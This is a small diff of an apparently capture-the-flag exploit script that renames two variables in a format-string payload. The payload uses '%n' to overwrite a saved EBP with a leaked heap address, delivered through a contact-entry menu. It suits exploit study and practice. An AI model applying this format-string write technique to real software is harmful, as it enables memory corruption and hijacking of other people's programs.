@@ -47,9 +47,9 @@ log.success('Heap_Addr:'+hex(heap_addr))
 log.success('EBP_Addr:'+hex(ebp_addr))
 
 #Modify the EBP
-part1 = (heap_addr - 4) / 2
-part2 = heap_addr - 4 - part1
-payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
+Pone = (heap_addr - 4) / 2
+Ptwo = heap_addr - 4 - Pone
+payload = '%' + str(Pone) + 'x%' + str(Ptwo) + 'x%6$n'
 CreateContact('Third','12345','40',payload)
 PrintContact()
 p.sendlineafter('>>> ','5')
